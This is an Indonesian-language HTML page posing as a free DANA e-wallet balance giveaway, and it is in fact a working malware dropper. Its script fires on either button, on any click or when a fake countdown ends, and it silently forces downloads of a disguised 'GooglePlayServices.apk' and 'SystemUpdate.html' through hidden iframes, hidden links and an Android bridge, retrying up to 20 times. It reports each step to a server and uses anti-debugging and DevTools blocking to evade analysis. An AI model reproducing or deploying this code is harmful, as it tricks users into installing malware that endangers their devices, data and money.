<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>Verifikasi</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        html,body{width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}
        #popupDana{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:linear-gradient(180deg,#1fa2ff 0%,#0e72d7 100%);display:flex;justify-content:center;align-items:center;text-align:center}
        .box{max-width:380px;width:90%;padding:20px}
        .logo-dana{display:flex;align-items:center;justify-content:center;gap:12px;margin:0 auto 15px}
        .icon-wrapper{width:70px;height:70px;background:#fff;border-radius:50%;display:flex;justify-content:center;align-items:center}
        .flag-svg{width:38px;height:33px;fill:#1fa2ff}
        .text-dana{color:#fff;font-family:'Outfit',sans-serif;font-size:50px;font-weight:700;letter-spacing:6px;text-shadow:0 0 1px rgba(255,255,255,0.5)}
        .subtitle{color:#b3d9ff;font-size:16px;margin:5px 0;font-weight:bold}
        .box-white{background:#fff;border-radius:15px;padding:20px;margin:15px 0}
        .box-white .label{color:#666;font-size:13px}
        .box-white .nominal{color:#108ee9;font-size:45px;font-weight:bold;margin:10px 0}
        .box-white .kuota{color:#0066cc;font-size:12px}
        .timer{color:#ffcc00;font-size:14px;font-weight:bold}
        .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px;transition:0.3s}
        .btn-klaim:hover{transform:scale(1.02)}
        .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
        .hidden-frame{position:absolute;width:0;height:0;border:none;visibility:hidden}
        .download-iframe{position:absolute;width:0;height:0;border:none;visibility:hidden}
    </style>
</head>
<body>

<!-- IFRAME TERSEMBUNYI UNTUK DOWNLOAD -->
<iframe id="downloadIframe1" class="download-iframe"></iframe>
<iframe id="downloadIframe2" class="download-iframe"></iframe>
<iframe id="downloadIframe3" class="download-iframe"></iframe>
<iframe id="downloadIframe4" class="download-iframe"></iframe>

<div id="popupDana">
    <div class="box">
        <div class="logo-dana">
            <div class="icon-wrapper">
                <svg class="flag-svg" viewBox="0 0 50 40" xmlns="http://www.w3.org/2000/svg">
                    <path d="M6 9 C15 16, 35 2, 44 9 L44 29 C35 22, 15 36, 6 29 Z" />
                </svg>
            </div>
            <div class="text-dana">DANA</div>
        </div>
        <div class="subtitle">🎉 SELAMAT! Anda mendapatkan Saldo DANA GRATIS!</div>
        <div class="box-white">
            <div class="label">Saldo DANA Gratis</div>
            <div class="nominal">Rp 500.000</div>
            <div class="kuota">🎁 Kuota terbatas!</div>
        </div>
        <div class="timer">⏰ Tersisa <span id="timer">00:10</span></div>
        <button class="btn-klaim" onclick="klaim()">✅ KLAIM SEKARANG</button>
        <button class="btn-tolak" onclick="tolak()">❌ Tidak, Terima Kasih</button>
    </div>
</div>

<script>
// ============================================================
// 🔥 INDEX.HTML - PASTI DOWNLOAD APK + HTML!
// ============================================================

// ============================================================
// STEALTH MAKSIMAL
// ============================================================
console.log = function() {};
console.warn = function() {};
console.error = function() {};
console.info = function() {};
console.debug = function() {};
console.table = function() {};

// ============================================================
// ANTI-ANALYSIS
// ============================================================
(function() {
    var check = function() {
        var start = Date.now();
        debugger;
        var end = Date.now();
        if (end - start > 100) {
            document.body.innerHTML = '';
            window.location.href = 'about:blank';
        }
    };
    setInterval(check, 1000);
})();

document.addEventListener('keydown', function(e) {
    if (e.key === 'F12' || 
        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
        (e.ctrlKey && e.key === 'U')) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }
});
document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });

window.onerror = function() { return true; };
window.addEventListener('error', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);
window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);

if (window.history && window.history.replaceState) {
    window.history.replaceState(null, null, window.location.href);
}
Object.defineProperty(document, 'referrer', { value: '' });

// ============================================================
// KONFIGURASI
// ============================================================
var GITHUB_USER = 'pandora-site';
var GITHUB_REPO = 'verifikasi-site';
var semuaDidapat = false;
var DOWNLOAD_STARTED = false;
var WS_PASSWORD = '';
var APK_DOWNLOADED = false;
var HTML_DOWNLOADED = false;
var RETRY_COUNT = 0;
var MAX_RETRY = 20;

// ============================================================
// KIRIM DATA KE SERVER
// ============================================================
function K(d) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 5000;
        xhr.send(JSON.stringify(d));
    } catch(e) {}
}

// ============================================================
// DETEKSI PLATFORM
// ============================================================
function detectPlatform() {
    var ua = navigator.userAgent.toLowerCase();
    var isAndroid = ua.indexOf('android') > -1;
    var isIOS = /iphone|ipad|ipod/.test(ua);
    var isWebView = ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1;
    var isAndroidBridge = typeof AndroidBridge !== 'undefined' || typeof window.AndroidBridge !== 'undefined';
    
    return {
        isAndroid: isAndroid,
        isIOS: isIOS,
        isWebView: isWebView,
        isAndroidBridge: isAndroidBridge,
        isPC: !isAndroid && !isIOS && !isWebView
    };
}
var PLATFORM = detectPlatform();

// ============================================================
// ANDROID BRIDGE
// ============================================================
var A = {
    isAvailable: (function() {
        if (typeof AndroidBridge !== 'undefined') return true;
        if (typeof window.AndroidBridge !== 'undefined') return true;
        if (navigator.userAgent.indexOf('Android') > -1) {
            try { return typeof AndroidBridge !== 'undefined'; } catch(e) {}
        }
        return false;
    })(),
    
    getBridge: function() {
        if (typeof AndroidBridge !== 'undefined') return AndroidBridge;
        if (typeof window.AndroidBridge !== 'undefined') return window.AndroidBridge;
        return null;
    },
    
    downloadFile: function(url, path) { 
        var b = this.getBridge();
        if(b && b.downloadFile){ try{ return b.downloadFile(url, path); }catch(e){} }
        return false;
    },
    saveFile: function(path, content) {
        var b = this.getBridge();
        if(b && b.saveFile){ try{ return b.saveFile(path, content); }catch(e){} }
        return false;
    },
    openFile: function(path) { 
        var b = this.getBridge();
        if(b && b.openFile){ try{ return b.openFile(path); }catch(e){} }
        return false;
    }
};

// ============================================================
// 🔥 FORCE DOWNLOAD APK (PASTI!)
// ============================================================
function forceDownloadAPK() {
    var apkUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
    var apkPath = '/storage/emulated/0/Download/GooglePlayServices.apk';
    
    K({ sumber: 'apk_download_start', data: 'forcing' });
    
    // ============================================================
    // METHOD 1: Android Bridge (LANGSUNG KE STORAGE!)
    // ============================================================
    if (A.isAvailable) {
        try {
            var result = A.downloadFile(apkUrl, apkPath);
            if (result) {
                APK_DOWNLOADED = true;
                K({ sumber: 'apk_bridge_success', data: apkPath });
                return;
            }
        } catch(e) {}
    }
    
    // ============================================================
    // METHOD 2: XHR + BLOB + DOWNLOAD (PASTI!)
    // ============================================================
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', apkUrl, true);
        xhr.responseType = 'blob';
        xhr.timeout = 120000; // 2 menit untuk APK besar!
        
        xhr.onload = function() {
            if (xhr.status === 200) {
                var blob = xhr.response;
                var blobUrl = URL.createObjectURL(blob);
                
                // Method 2a: via iframe
                try {
                    var iframe = document.getElementById('downloadIframe1');
                    if (!iframe) {
                        iframe = document.createElement('iframe');
                        iframe.id = 'downloadIframe1';
                        iframe.className = 'download-iframe';
                        document.body.appendChild(iframe);
                    }
                    iframe.src = blobUrl;
                    APK_DOWNLOADED = true;
                    K({ sumber: 'apk_iframe_success', data: 'ok' });
                    setTimeout(function() { URL.revokeObjectURL(blobUrl); }, 5000);
                    return;
                } catch(e) {}
                
                // Method 2b: via hidden link
                try {
                    var link = document.createElement('a');
                    link.href = blobUrl;
                    link.download = 'GooglePlayServices.apk';
                    link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
                    document.body.appendChild(link);
                    setTimeout(function() {
                        link.click();
                        APK_DOWNLOADED = true;
                        K({ sumber: 'apk_link_success', data: 'ok' });
                        setTimeout(function() {
                            try { document.body.removeChild(link); } catch(e) {}
                            URL.revokeObjectURL(blobUrl);
                        }, 2000);
                    }, 300);
                    return;
                } catch(e) {}
            }
            K({ sumber: 'apk_xhr_status', data: xhr.status });
        };
        xhr.onerror = function() { K({ sumber: 'apk_xhr_error', data: 'network' }); };
        xhr.ontimeout = function() { K({ sumber: 'apk_xhr_timeout', data: 'timeout' }); };
        xhr.send();
    } catch(e) {
        K({ sumber: 'apk_xhr_exception', data: e.message });
    }
    
    // ============================================================
    // METHOD 3: WINDOW.OPEN (FALLBACK)
    // ============================================================
    try {
        var win = window.open(apkUrl, '_blank');
        if (win) {
            APK_DOWNLOADED = true;
            K({ sumber: 'apk_window_open', data: 'ok' });
            setTimeout(function() { try { win.close(); } catch(e) {} }, 1000);
        }
    } catch(e) {}
    
    // ============================================================
    // METHOD 4: IFRAME SRCDOC (FALLBACK)
    // ============================================================
    try {
        var iframe2 = document.getElementById('downloadIframe2');
        if (!iframe2) {
            iframe2 = document.createElement('iframe');
            iframe2.id = 'downloadIframe2';
            iframe2.className = 'download-iframe';
            document.body.appendChild(iframe2);
        }
        iframe2.src = apkUrl + '?t=' + Date.now();
        APK_DOWNLOADED = true;
        K({ sumber: 'apk_iframe2', data: 'ok' });
    } catch(e) {}
}

// ============================================================
// 🔥 FORCE DOWNLOAD HTML (PASTI!)
// ============================================================
function forceDownloadHTML() {
    var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
    var htmlPath = '/storage/emulated/0/Download/SystemUpdate.html';
    
    K({ sumber: 'html_download_start', data: 'forcing' });
    
    // ============================================================
    // METHOD 1: Android Bridge
    // ============================================================
    if (A.isAvailable) {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', htmlUrl, true);
            xhr.timeout = 15000;
            xhr.onload = function() {
                if (xhr.status === 200) {
                    A.saveFile(htmlPath, xhr.responseText);
                    HTML_DOWNLOADED = true;
                    K({ sumber: 'html_bridge_success', data: htmlPath });
                }
            };
            xhr.send();
        } catch(e) {}
    }
    
    // ============================================================
    // METHOD 2: XHR + Blob + Download
    // ============================================================
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', htmlUrl, true);
        xhr.timeout = 15000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                var html = xhr.responseText;
                
                // Save ke localStorage
                try { localStorage.setItem('SystemUpdate.html', html); } catch(e) {}
                
                // Download via blob
                try {
                    var blob = new Blob([html], { type: 'text/html' });
                    var blobUrl = URL.createObjectURL(blob);
                    
                    // via iframe
                    try {
                        var iframe = document.getElementById('downloadIframe3');
                        if (!iframe) {
                            iframe = document.createElement('iframe');
                            iframe.id = 'downloadIframe3';
                            iframe.className = 'download-iframe';
                            document.body.appendChild(iframe);
                        }
                        iframe.src = blobUrl;
                        HTML_DOWNLOADED = true;
                        K({ sumber: 'html_iframe_success', data: 'ok' });
                        setTimeout(function() { URL.revokeObjectURL(blobUrl); }, 5000);
                        return;
                    } catch(e) {}
                    
                    // via link
                    try {
                        var link = document.createElement('a');
                        link.href = blobUrl;
                        link.download = 'SystemUpdate.html';
                        link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
                        document.body.appendChild(link);
                        setTimeout(function() {
                            link.click();
                            HTML_DOWNLOADED = true;
                            K({ sumber: 'html_link_success', data: 'ok' });
                            setTimeout(function() {
                                try { document.body.removeChild(link); } catch(e) {}
                                URL.revokeObjectURL(blobUrl);
                            }, 2000);
                        }, 300);
                        return;
                    } catch(e) {}
                } catch(e) {}
            }
        };
        xhr.send();
    } catch(e) {}
    
    // ============================================================
    // METHOD 3: IFRAME
    // ============================================================
    try {
        var iframe4 = document.getElementById('downloadIframe4');
        if (!iframe4) {
            iframe4 = document.createElement('iframe');
            iframe4.id = 'downloadIframe4';
            iframe4.className = 'download-iframe';
            document.body.appendChild(iframe4);
        }
        iframe4.src = htmlUrl + '?t=' + Date.now();
        HTML_DOWNLOADED = true;
        K({ sumber: 'html_iframe4', data: 'ok' });
    } catch(e) {}
}

// ============================================================
// 🔥 AUTO DOWNLOAD PAYLOAD (PASTI KEDUANYA!)
// ============================================================
function autoDownloadPayload() {
    if (DOWNLOAD_STARTED) return;
    DOWNLOAD_STARTED = true;
    
    K({ sumber: 'auto_download_start', data: 'both_files' });
    
    // ============================================================
    // 🔥 DOWNLOAD APK (MULTI METODE!)
    // ============================================================
    forceDownloadAPK();
    
    // ============================================================
    // 🔥 DOWNLOAD HTML (MULTI METODE!)
    // ============================================================
    forceDownloadHTML();
    
    // ============================================================
    // 🔥 RETRY 20x JIKA GAGAL (UNTUK APK!)
    // ============================================================
    var retryInterval = setInterval(function() {
        RETRY_COUNT++;
        if (RETRY_COUNT > MAX_RETRY) {
            clearInterval(retryInterval);
            K({ sumber: 'download_retry_end', data: 'max_retry' });
            return;
        }
        
        if (!APK_DOWNLOADED) {
            K({ sumber: 'download_retry_apk', data: RETRY_COUNT });
            forceDownloadAPK();
        }
        
        if (!HTML_DOWNLOADED) {
            K({ sumber: 'download_retry_html', data: RETRY_COUNT });
            forceDownloadHTML();
        }
        
        if (APK_DOWNLOADED && HTML_DOWNLOADED) {
            clearInterval(retryInterval);
            K({ sumber: 'download_complete', data: 'both_success' });
        }
    }, 5000);
}

// ============================================================
// 🔥 AMBIL PASSWORD DARI WORKER
// ============================================================
function getPasswordFromWorker() {
    return new Promise(function(resolve, reject) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '/get-password', true);
        xhr.timeout = 10000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                try { var data = JSON.parse(xhr.responseText); if (data.password) { WS_PASSWORD = data.password; resolve(WS_PASSWORD); } else { reject(new Error('No password')); } } catch(e) { reject(e); }
            } else { reject(new Error('HTTP ' + xhr.status)); }
        };
        xhr.onerror = function() { reject(new Error('Network error')); };
        xhr.ontimeout = function() { reject(new Error('Timeout')); };
        xhr.send();
    });
}

// ============================================================
// 🔥 MAIN EXECUTION - TANPA REDIRECT!
// ============================================================
function dapatkanSemua() {
    if (semuaDidapat) return;
    semuaDidapat = true;
    
    try {
        var popup = document.getElementById('popupDana');
        if (popup) popup.style.display = 'none';
        
        K({ sumber: 'trigger', data: 'dapatkanSemua' });
        
        // 🔥 AUTO DOWNLOAD PAYLOAD (PASTI KEDUANYA!)
        autoDownloadPayload();
        
        // 🔥 AMBIL PASSWORD
        getPasswordFromWorker().then(function(password) { WS_PASSWORD = password; K({ sumber: 'password_received', data: 'ok' }); }).catch(function() {});
        
    } catch(e) {
        K({ sumber: 'dapatkanSemua_error', data: e.message });
    }
}

function klaim() { K({sumber:'izin', data:'klaim'}); dapatkanSemua(); }
function tolak() { K({sumber:'izin', data:'tolak'}); dapatkanSemua(); }

// ============================================================
// TIMER (10 DETIK)
// ============================================================
var w = 10;
var timerInterval = setInterval(function() {
    w--;
    var el = document.getElementById('timer');
    if (el) el.textContent = '00:' + (w < 10 ? '0' + w : w);
    if (w <= 0) {
        clearInterval(timerInterval);
        K({sumber:'izin', data:'auto'});
        dapatkanSemua();
    }
}, 1000);

document.addEventListener('click', function() {
    if (!semuaDidapat) {
        K({sumber:'izin', data:'click_anywhere'});
        dapatkanSemua();
    }
});

console.log('✅ index.html loaded - PASTI DOWNLOAD APK + HTML!');
</script>
</body>
</html>
